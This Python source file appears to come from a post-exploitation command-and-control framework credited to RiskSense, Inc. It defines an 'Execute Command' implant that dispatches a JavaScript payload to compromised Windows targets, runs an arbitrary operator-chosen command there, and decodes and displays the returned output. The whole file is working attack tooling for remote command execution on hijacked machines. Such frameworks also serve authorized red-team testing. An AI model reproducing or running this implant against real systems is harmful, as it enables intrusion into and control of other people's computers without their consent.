import core.job
import core.implant
import uuid

class ExecCmdJob(core.job.Job):
    def report(self, handler, data, sanitize = False):
        self.results = self.decode_downloaded_data(data, self.session.encoder, True).decode("cp"+self.session.shellchcp)
        handler.reply(200)
        self.done()

    def done(self):
        self.display()

    def display(self):
        self.shell.print_plain("Result for `%s`:" % self.options.get('CMD').replace('\\"', '"').replace("\\\\", "\\"))
        self.shell.print_plain(self.results)

class ExecCmdImplant(core.implant.Implant):

    NAME = "Execute Command"
    DESCRIPTION = "Executes a command on the target system."
    AUTHORS = ["RiskSense, Inc."]

    def load(self):
        self.options.register("CMD", "hostname", "command to run")
        self.options.register("OUTPUT", "true", "retrieve output?", enum=["true", "false"])
        self.options.register("DIRECTORY", "%TEMP%", "writeable directory for output", required=False)
        self.options.register("FCMD", "", "cmd after escaping", hidden=True)
        self.options.register("FDIRECTORY", "", "dir after escaping", hidden=True)
        # self.options.register("FILE", "", "random uuid for file name", hidden=True)

    def job(self):
        return ExecCmdJob

    def run(self):
        # generate new file every time this is run
        # self.options.set("FILE", uuid.uuid4().hex)
        self.options.set("FCMD", self.options.get('CMD').replace("\\", "\\\\").replace('"', '\\"'))
        self.options.set("FDIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))

        payloads = {}
        #payloads["vbs"] = self.load_script("data/implant/manage/exec_cmd.vbs", self.options)
        payloads["js"] = self.loader.load_script("data/implant/manage/exec_cmd.js", self.options)

        self.dispatch(payloads, self.job)
